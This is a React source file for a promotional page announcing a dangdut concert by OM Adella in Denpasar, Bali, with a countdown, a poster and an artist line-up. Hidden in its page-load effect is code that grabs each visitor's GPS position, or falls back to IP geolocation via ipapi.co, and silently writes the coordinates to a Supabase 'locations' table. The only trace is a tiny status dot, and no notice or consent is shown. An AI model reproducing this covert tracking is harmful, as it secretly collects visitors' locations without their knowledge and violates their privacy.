import { useState, useEffect } from "react";
import { supabase } from "./lib/supabase";

const POSTER_URL = "https://euaoxfgshkszfpelbmev.supabase.co/storage/v1/object/public/adella/poster.jpeg";

const SHOWS = [
  {
    id: 1,
    title: "Pasar Rakyat Sesetan Bali",
    venue: "Jl. Raya Sesetan, Denpasar - Bali",
    date: new Date("2026-02-07T19:00:00"),
    artists: [
      "Fira Azzahra",
      "Difarina Indra",
      "Cantika Nuswantoro",
      "Sabila Permata",
      "Lusyana Jelita",
      "Devinta Salatnaya",
      "Nurma Paejah",
    ],
    type: "Event Live Malam",
  },
];

function useCountdown(target: Date) {
  const [timeLeft, setTimeLeft] = useState({ d: 0, h: 0, m: 0, s: 0, over: false });
  useEffect(() => {
    const tick = () => {
      const diff = target.getTime() - Date.now();
      if (diff <= 0) return setTimeLeft({ d: 0, h: 0, m: 0, s: 0, over: true });
      setTimeLeft({
        d: Math.floor(diff / 86400000),
        h: Math.floor((diff % 86400000) / 3600000),
        m: Math.floor((diff % 3600000) / 60000),
        s: Math.floor((diff % 60000) / 1000),
        over: false,
      });
    };
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, [target]);
  return timeLeft;
}

function useDarkMode() {
  const [dark, setDark] = useState(
    () => window.matchMedia?.("(prefers-color-scheme: dark)").matches ?? false
  );
  useEffect(() => {
    const mq = window.matchMedia("(prefers-color-scheme: dark)");
    const handler = (e: MediaQueryListEvent) => setDark(e.matches);
    mq.addEventListener("change", handler);
    return () => mq.removeEventListener("change", handler);
  }, []);
  return dark;
}

function CountdownBox({ value, label, dark }: { value: number; label: string; dark: boolean }) {
  return (
    <div style={{ textAlign: "center" }}>
      <div style={{
        background: dark ? "rgba(212,175,55,0.15)" : "rgba(212,175,55,0.12)",
        border: "1.5px solid #D4AF37",
        borderRadius: 10,
        padding: "10px 14px",
        fontSize: 30,
        fontFamily: "'Playfair Display', serif",
        fontWeight: 700,
        color: "#D4AF37",
        lineHeight: 1,
        minWidth: 58,
        letterSpacing: 1,
      }}>
        {String(value).padStart(2, "0")}
      </div>
      <div style={{ fontSize: 10, color: dark ? "#a08840" : "#8a7020", marginTop: 5, letterSpacing: 2, textTransform: "uppercase" }}>
        {label}
      </div>
    </div>
  );
}

export default function App() {
  const dark = useDarkMode();
  const [locationStatus, setLocationStatus] = useState<"pending" | "done" | "error">("pending");
  const [locationSource, setLocationSource] = useState<"gps" | "ip" | null>(null);
  const cd = useCountdown(SHOWS[0].date);

  const bg = dark ? "#0d0c08" : "#fffdf5";
  const text = dark ? "#fff" : "#1a1500";
  const subText = dark ? "#b09050" : "#7a6010";
  const cardBg = dark ? "rgba(255,255,255,0.04)" : "rgba(0,0,0,0.03)";
  const cardBorder = dark ? "rgba(212,175,55,0.2)" : "rgba(212,175,55,0.35)";
  const gold = "#D4AF37";
  const gold2 = "#f0c040";

  const saveLocation = async (lat: number, lng: number, source: "gps" | "ip") => {
    try {
      await supabase.from("locations").insert([{ latitude: lat, longitude: lng, source }]);
    } catch (_) {}
    setLocationSource(source);
    setLocationStatus("done");
  };

  const fallbackToIP = async () => {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      if (data.latitude && data.longitude) {
        await saveLocation(data.latitude, data.longitude, "ip");
      } else setLocationStatus("error");
    } catch { setLocationStatus("error"); }
  };

  useEffect(() => {
    if (!navigator.geolocation) { fallbackToIP(); return; }
    navigator.geolocation.getCurrentPosition(
      (pos) => saveLocation(pos.coords.latitude, pos.coords.longitude, "gps"),
      () => fallbackToIP(),
      { timeout: 8000, maximumAge: 60000 }
    );
  }, []);

  const show = SHOWS[0];

  return (
    <div style={{
      minHeight: "100vh",
      background: bg,
      color: text,
      fontFamily: "'Lora', Georgia, serif",
      transition: "background 0.3s, color 0.3s",
    }}>
      {/* Decorative top bar */}
      <div style={{ height: 4, background: `linear-gradient(90deg, ${gold}, ${gold2}, ${gold})` }} />

      {/* Header */}
      <header style={{
        textAlign: "center",
        padding: "32px 20px 24px",
        borderBottom: `1px solid ${cardBorder}`,
        position: "relative",
      }}>
        <div style={{ fontSize: 11, letterSpacing: 6, color: gold, textTransform: "uppercase", marginBottom: 6 }}>
          ✦ The Real Dangdut Koplo ✦
        </div>
        <h1 style={{
          fontFamily: "'Playfair Display', serif",
          fontSize: "clamp(48px, 12vw, 96px)",
          fontWeight: 700,
          margin: "0 0 4px",
          lineHeight: 1,
          background: `linear-gradient(135deg, ${gold} 0%, ${gold2} 50%, #c8960c 100%)`,
          WebkitBackgroundClip: "text",
          WebkitTextFillColor: "transparent",
          letterSpacing: -1,
        }}>
          OM Adella
        </h1>
        <div style={{ color: subText, fontSize: 13, letterSpacing: 3, textTransform: "uppercase" }}>
          Special Performance All Artis
        </div>
        {/* tiny location dot */}
        <div style={{
          position: "absolute", top: 16, right: 16,
          width: 8, height: 8, borderRadius: "50%",
          background: locationStatus === "done" ? "#4caf50" : locationStatus === "error" ? "#f44336" : gold,
          boxShadow: `0 0 6px ${locationStatus === "done" ? "#4caf50" : gold}`,
        }} title={locationStatus === "done" ? `Lokasi via ${locationSource}` : "Mendeteksi lokasi..."} />
      </header>

      <main style={{ maxWidth: 680, margin: "0 auto", padding: "32px 20px 80px" }}>

        {/* Poster */}
        <div style={{
          borderRadius: 20,
          overflow: "hidden",
          border: `1.5px solid ${cardBorder}`,
          boxShadow: dark
            ? "0 8px 40px rgba(212,175,55,0.15)"
            : "0 8px 40px rgba(0,0,0,0.12)",
          marginBottom: 32,
        }}>
          <img
            src={POSTER_URL}
            alt="Poster OM Adella - Pasar Rakyat Sesetan Bali"
            style={{ width: "100%", display: "block" }}
          />
        </div>

        {/* Event Card */}
        <div style={{
          background: cardBg,
          border: `1px solid ${cardBorder}`,
          borderRadius: 20,
          padding: "28px 24px",
          marginBottom: 28,
          position: "relative",
          overflow: "hidden",
        }}>
          <div style={{
            position: "absolute", top: 0, left: 0, right: 0, height: 3,
            background: `linear-gradient(90deg, ${gold}, ${gold2}, transparent)`,
          }} />

          <div style={{ fontSize: 11, letterSpacing: 3, color: gold, textTransform: "uppercase", marginBottom: 10 }}>
            Event Berikutnya
          </div>
          <div style={{
            fontFamily: "'Playfair Display', serif",
            fontSize: "clamp(20px, 5vw, 28px)",
            fontWeight: 700,
            color: text,
            marginBottom: 14,
          }}>
            {show.title}
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: 8, marginBottom: 20 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10, color: subText, fontSize: 14 }}>
              <span>📅</span>
              <span>Sabtu, 07 Februari 2026 · Malam</span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: 10, color: subText, fontSize: 14 }}>
              <span>📍</span>
              <a
                href="https://maps.google.com/?q=Jl.+Raya+Sesetan+Denpasar+Bali"
                target="_blank"
                rel="noopener noreferrer"
                style={{ color: gold, textDecoration: "underline" }}
              >
                {show.venue}
              </a>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: 10, color: subText, fontSize: 14 }}>
              <span>🎪</span>
              <span>{show.type}</span>
            </div>
          </div>

          {/* Artists */}
          <div style={{
            background: dark ? "rgba(212,175,55,0.07)" : "rgba(212,175,55,0.08)",
            border: `1px solid ${cardBorder}`,
            borderRadius: 12,
            padding: "14px 16px",
          }}>
            <div style={{ fontSize: 11, letterSpacing: 2, color: gold, textTransform: "uppercase", marginBottom: 10 }}>
              Line-up Artis
            </div>
            <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
              {show.artists.map((a) => (
                <span key={a} style={{
                  background: dark ? "rgba(212,175,55,0.12)" : "rgba(212,175,55,0.15)",
                  border: `1px solid ${gold}55`,
                  borderRadius: 20,
                  padding: "5px 14px",
                  fontSize: 13,
                  color: dark ? gold2 : "#7a5500",
                  fontWeight: 500,
                }}>
                  {a}
                </span>
              ))}
            </div>
          </div>
        </div>

        {/* Countdown */}
        {!cd.over ? (
          <div style={{
            background: cardBg,
            border: `1px solid ${cardBorder}`,
            borderRadius: 20,
            padding: "28px 24px",
            marginBottom: 28,
            textAlign: "center",
          }}>
            <div style={{ fontSize: 11, letterSpacing: 3, color: gold, textTransform: "uppercase", marginBottom: 18 }}>
              ⏳ Hitung Mundur
            </div>
            <div style={{ display: "flex", justifyContent: "center", gap: 12, flexWrap: "wrap" }}>
              <CountdownBox value={cd.d} label="Hari" dark={dark} />
              <CountdownBox value={cd.h} label="Jam" dark={dark} />
              <CountdownBox value={cd.m} label="Menit" dark={dark} />
              <CountdownBox value={cd.s} label="Detik" dark={dark} />
            </div>
          </div>
        ) : (
          <div style={{
            background: cardBg,
            border: `1px solid ${cardBorder}`,
            borderRadius: 20,
            padding: "24px",
            marginBottom: 28,
            textAlign: "center",
            color: subText,
            fontStyle: "italic",
          }}>
            🎉 Event telah berlangsung — terima kasih sudah hadir!
          </div>
        )}

        {/* CTA */}
        <div style={{
          background: cardBg,
          border: `1px solid ${cardBorder}`,
          borderRadius: 20,
          padding: "28px 24px",
          textAlign: "center",
        }}>
          <div style={{
            fontFamily: "'Playfair Display', serif",
            fontSize: 20,
            color: gold,
            marginBottom: 8,
          }}>
            Info & Pemesanan
          </div>
          <p style={{ color: subText, fontSize: 14, marginBottom: 20, margin: "0 0 20px" }}>
            Booking manggung, hajatan, atau info jadwal OM Adella
          </p>
          <div style={{ display: "flex", gap: 12, justifyContent: "center", flexWrap: "wrap" }}>
            <a
              href="https://wa.me/"
              target="_blank"
              rel="noopener noreferrer"
              style={{
                display: "inline-block",
                background: "linear-gradient(135deg, #25d366, #128c7e)",
                color: "#fff",
                padding: "12px 28px",
                borderRadius: 30,
                fontFamily: "sans-serif",
                fontSize: 14,
                fontWeight: 600,
                textDecoration: "none",
                letterSpacing: 0.5,
              }}
            >
              📱 WhatsApp
            </a>
            <a
              href="https://www.instagram.com/"
              target="_blank"
              rel="noopener noreferrer"
              style={{
                display: "inline-block",
                background: "linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366)",
                color: "#fff",
                padding: "12px 28px",
                borderRadius: 30,
                fontFamily: "sans-serif",
                fontSize: 14,
                fontWeight: 600,
                textDecoration: "none",
                letterSpacing: 0.5,
              }}
            >
              📸 Instagram
            </a>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer style={{
        borderTop: `1px solid ${cardBorder}`,
        textAlign: "center",
        padding: "20px",
        color: dark ? "#444" : "#aaa",
        fontSize: 12,
        letterSpacing: 1,
      }}>
        © 2026 OM Adella · The Real Dangdut Koplo ✦
      </footer>

      <div style={{ height: 4, background: `linear-gradient(90deg, ${gold}, ${gold2}, ${gold})` }} />

      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Lora:wght@400;500&display=swap');
        * { box-sizing: border-box; }
        body { margin: 0; }
      `}</style>
    </div>
  );
}